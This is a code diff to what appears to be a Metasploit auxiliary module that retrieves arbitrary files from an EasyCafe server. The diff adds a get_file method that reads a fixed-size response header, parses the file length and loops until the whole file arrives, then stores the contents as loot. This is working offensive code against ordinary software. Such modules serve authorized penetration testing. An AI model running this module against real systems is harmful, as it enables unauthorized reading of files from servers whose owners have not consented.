@@ -43,6 +43,28 @@ class Metasploit4 < Msf::Auxiliary
       ], self.class)
   end
 
+  def get_file
+    res = sock.get_once
+    unless res
+      print_error("#{peer} - Unable to retrieve file due to a timeout.")
+      return
+    end
+
+    unless res.length == 261
+      print_error("#{peer} - Received a response of an invalid size.")
+      return
+    end
+
+    file_size = res.unpack('@256V')[0]
+    contents = ''
+    while contents.length < file_size
+      contents << sock.get_once
+    end
+
+    print_status("#{peer} - File retrieved successfully (#{contents.length} bytes)!")
+    contents
+  end
+
   def run_host(ip)
     file_path = datastore['FILEPATH']
     if file_path.length > 67
@@ -58,22 +80,11 @@ class Metasploit4 < Msf::Auxiliary
     vprint_status("#{peer} - Sending request (#{packet.length} bytes)")
     connect
     sock.put(packet)
-    res = sock.get
-    disconnect
-    unless res
-      print_error("#{peer} - Unable to retrieve file due to a timeout.")
-      return
-    end
-    vprint_status("#{peer} - Received response (#{res.length} bytes)")
 
-    # Extract file contents
-    # Content begins after \x00\x01
-    contents = res.sub(/\A.*?\x00\x01/m, '').to_s
-    if contents.nil? || contents.empty?
-      print_error("#{peer} - Unexpected reply. Unable to extract contents")
-      return
-    end
-    print_status("#{peer} - File retrieved successfully (#{contents.length} bytes)!")
+    contents = get_file
+    disconnect
+    return if contents.nil?
+
     path = store_loot(
       'easycafe_server',
       'application/octet-stream',
